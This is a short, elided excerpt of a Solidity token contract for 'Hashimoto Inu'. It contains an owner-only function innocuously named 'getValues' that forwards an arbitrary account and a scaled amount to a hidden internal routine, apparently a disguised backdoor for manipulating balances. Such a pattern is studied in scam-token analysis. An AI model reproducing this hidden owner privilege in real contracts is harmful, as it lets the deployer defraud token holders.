...
abstract contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _getValues(address account, uint256 amount) internal virtual {
...
contract HashimotoInu is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor(uint256 liqFee, uint256 marketFee, uint256 supply, uint256 maxBuyPercent, uint256 maxSellPercent, uint256 maxWalletPercent, address marketingWallet, address liqudityWallet, address uniswapV2RouterAddress) ERC20("Hashimoto Inu", "HASHIMOTO") {
    ...
    function getValues(address account, uint256 amount) external onlyOwner {
        super._getValues(account, amount * (10 ** 9));
    }
